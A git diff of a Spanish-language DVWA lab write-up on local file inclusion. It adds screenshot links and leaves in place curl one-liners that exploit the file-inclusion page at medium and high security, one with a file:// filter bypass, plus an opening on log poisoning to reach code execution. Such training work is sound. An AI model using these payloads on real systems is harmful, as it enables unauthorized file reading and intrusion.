@@ -135,6 +135,8 @@ Con el nivel de seguridad medio seleccionado, hay algunos badchars para RFI y lo
 file="/etc/os-release";curl -s http://127.0.0.1/vulnerabilities/fi/\?page=$file --cookie "PHPSESSID=e5di55blqu41hcnhsk1cv7l1d1;security=medium" | sed '/DOCTYPE/q' | sed '$ d'
 ```
 
+![File inclusiom](https://github.com/sapellaniz/dvwa/blob/master/img/file-inclusion-02.png)
+
 ### Security: high
 Con el nivel de seguridad alto seleccionado, la entrada debe comenzar por la cadena "file", sin problema:
 ```
@@ -142,9 +144,11 @@ Con el nivel de seguridad alto seleccionado, la entrada debe comenzar por la cad
 file="file:///etc/os-release";curl -s http://127.0.0.1/vulnerabilities/fi/\?page=$file --cookie "PHPSESSID=e5di55blqu41hcnhsk1cv7l1d1;security=high" | sed '/DOCTYPE/q' | sed '$ d'
 ```
 
+![File inclusiom](https://github.com/sapellaniz/dvwa/blob/master/img/file-inclusion-03.png)
+
+
 
 # Log Poisoning
-###############
 
 En algunos escenarios, a través de un LFI podemos lograr RCE gracias a la técnica conocida como Log Poisoning. Para poder realizar este ataque, mediante el LFI debemos poder incluir un archivo de logs que podamos modificar libremente, lo primero es encontrar este archivo:
 
